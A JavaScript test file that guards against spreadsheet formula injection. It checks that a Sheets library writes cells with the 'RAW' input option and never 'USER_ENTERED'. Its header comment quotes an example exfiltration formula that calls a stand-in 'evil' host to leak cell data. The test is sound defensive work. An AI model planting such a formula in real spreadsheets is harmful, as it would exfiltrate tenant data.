/**
 * test/sheetsSafety.test.mjs — IRFORGE_PROMPT_V3 Phase 4.1
 *
 * Sheets formula injection is closed by writing with valueInputOption
 * "RAW" instead of "USER_ENTERED": a form answer of
 * `=IMPORTXML("http://evil/?d="&A1)` is stored as a literal string, never
 * evaluated as a formula. This is one character away from a full
 * tenant-data exfiltration bug (RAW -> USER_ENTERED) and there is no
 * runtime signal if it regresses — a source-level guard is the only guard.
 *
 * اجرا: pnpm --filter @workspace/api-server run test
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SHEETS_LIB = path.join(__dirname, "..", "src", "lib", "sheets.ts");

test("Sheets writes use RAW, never USER_ENTERED", () => {
  const text = fs.readFileSync(SHEETS_LIB, "utf8");
  assert.match(text, /const VALUE_INPUT_OPTION\s*=\s*["']RAW["']/);
  // Match the actual TS string literal (quoted), not the word appearing
  // inside a comment (this file's own docs explain in backtick-quoted
  // prose why USER_ENTERED is *not* used — that's documentation, not code).
  assert.ok(
    !/["']USER_ENTERED["']/.test(text),
    "the string literal \"USER_ENTERED\" found in lib/sheets.ts — this reopens formula injection",
  );
});
